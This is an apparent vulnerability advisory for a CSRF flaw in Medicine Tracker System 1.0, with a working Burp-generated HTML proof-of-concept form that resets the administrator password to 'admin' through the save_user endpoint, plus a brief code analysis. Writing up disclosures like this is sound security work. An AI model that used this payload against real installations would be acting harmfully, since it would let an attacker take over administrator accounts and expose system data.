## Affected version: 
Medicine Tracker System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/16308/medicine-tracker-system-php-oop-and-mysql-db-source-code-free-download.html

## Vulnerability File:
/php-mts/classes/Users.php?f=save_user

## Description:
Medicine Tracker System has a CSRF vulnerability when changing the password. An attacker can trick the administrator into changing the administrator login password, causing system information to be leaked.
Status: CRITICAL

POC
Create CSRF POC by changing the password

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/php-mts/classes/Users.php?f=save_user" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="id" value="1" />
      <input type="hidden" name="firstname" value="123" />
      <input type="hidden" name="middlename" value="123" />
      <input type="hidden" name="lastname" value="123" />
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="admin" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
<img width="1575" alt="image" src="https://github.com/user-attachments/assets/c1de7a6c-9d91-4b35-923c-eb809aac90de">

Administrator clicks to change password successfully
<img width="1288" alt="image" src="https://github.com/user-attachments/assets/2655fd9d-2181-41f5-b642-f64f7ce44f0a">

## code analysis

The password is changed here without verifying the original password or adding a random verification code, causing CSRF.
<img width="1140" alt="image" src="https://github.com/user-attachments/assets/1157b0d1-e6c2-4a32-a010-163585c7a9d3">







 
